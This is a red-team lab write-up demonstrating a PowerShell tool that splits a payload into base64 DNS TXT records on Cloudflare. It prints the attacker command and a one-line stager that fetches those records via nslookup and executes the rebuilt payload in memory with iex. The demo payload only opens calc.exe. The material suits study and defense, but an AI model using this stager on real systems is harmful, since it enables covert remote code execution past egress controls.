---
description: >-
  This lab demos a tool or rather a Powershell script I have written to do what
  the title says.
---

# Payload delivery via DNS using Invoke-PowerCloud

## Credits

Rushing to say that the tool [**Invoke-PowerCloud**](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) was heavily inspired by and based on the awesome work that Dominic Chell \([@domchell](https://twitter.com/domchell)\) from [MDSec](https://twitter.com/MDSecLabs) had done with [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) - go follow them and try out the [tool](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/) if you are not doing so yet!

Not only that, I want to thank Dominic for taking his time to answer some of my questions regarding the PowerDNS, the setup and helping me troubleshoot it as I was having "some" issues getting the payload delivered to the target from the PowerDNS server.

...which eventually led me to Invoke-PowerCloud, so read on.

## What is Invoke-PowerCloud?

[Invoke-PowerCloud](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) is a script that allows you to deliver a powershell payload using DNS TXT records to a target in an environment that is egress limited to DNS only.

## How is Invoke-PowerCloud different from PowerDNS?

I assume you have read [PowerShell DNS Delivery with PowerDNS](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/) which explains how PowerDNS works.

Invoke-PowerCloud works in a similar fashion, except for a couple of key differences, which may simplify the configuration process of your infrastructure to start delivering paylods via DNS.   
  
**With PowerDNS you need:**

* a dedicated linux box with a public IP where you can run PowerDNS, so it can act as a DNS server
* you also need multiple domain names to get the nameservers configured properly

**With Invoke-PowerCloud you need:**

* a cloudflare.com account
* a domain name whose DNS management is transferred to cloudflare

## Cloudflare? eh?

The way the tools works is by performing the following high level steps:

* Take the powershell payload file
* Divide the payload file into chunks of 255 bytes
* Create a DNS zone file with DNS TXT records representing each chunk of the payload data retrieved from the previous step in base64 format
* Send the generated DNS zone file to cloudlfare using their APIs
* Generate two stagers for use with autoritative NS/non-authoritative NS
* Stager can then be executed on the victim system. The stager will recover the base64 chunks from the DNS TXT records and rebuild the original payload
* Payload gets executed in memory - boom!
* If you run the tool again to deliver another payload, the previous DNS TXT records will be deleted

## Demo / Execution

### One off Configuration

Remember - you need a cloudflare.com account for this to work. Assuming you have that, you need to edit the script to specify: 

1. your cloudflare API key, defined in the variable `$Global:API_KEY`
2. your cloudflare email address, defined in the variable `$Global:EMAIL`

![](../.gitbook/assets/screenshot-from-2018-10-15-22-11-03%20%281%29.png)

### DNS Management

Secondly, you need to move the domain name which you are going to use for payload delivery to cloudflare. In this demo, I will use a domain I own `redteam.me` which is now managed by cloudflare:

![](../.gitbook/assets/screenshot-from-2018-10-15-22-14-53.png)

Let's confirm redteam.me DNS is managed by cloudflare by issuing:

```text
host -t ns redteam.me
```

![](../.gitbook/assets/screenshot-from-2018-10-15-22-16-20.png)

### Payload

Let's create a simple payload file - it will print a red message to the screen and open up a calc.exe:

{% code-tabs %}
{% code-tabs-item title="payload.txt" %}
```csharp
Write-host -foregroundcolor red "This is our first payload using Invoke-
PowerCloud. As usual, let's pop the calc.exe"; Start-process calc.exe
```
{% endcode-tabs-item %}
{% endcode-tabs %}

### Good to Go

We are now good to go - issue the below on your attacking system:

```csharp
PS C:\tools\powercloud> . .\powercloud.ps1; Invoke-PowerCloud -FilePath .\payload.txt -Domain redteam.me -Verbose
```

The script will generate two stagers that looks like the one below - it's the code that can be executed on the target system:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
# stager to be launched on the victim system
$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-26.png)

Let's execite the stager on the victim system to get the payload delivered via DNS:

![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-12.png)

Everything in action can be seen in the below gif:

![](../.gitbook/assets/invoke-powercloud-demo.gif)

## Is Invoke-PowerCloud better than PowerDNS?

No. It just works slightly differently, but achieves the same end goal.

## Download

You can download or contribute to Invoke-PowerCloud here:

{% embed url="https://github.com/mantvydasb/powercloud" %}

## References

{% embed url="https://github.com/mdsecactivebreach/PowerDNS" %}

{% embed url="https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/" %}



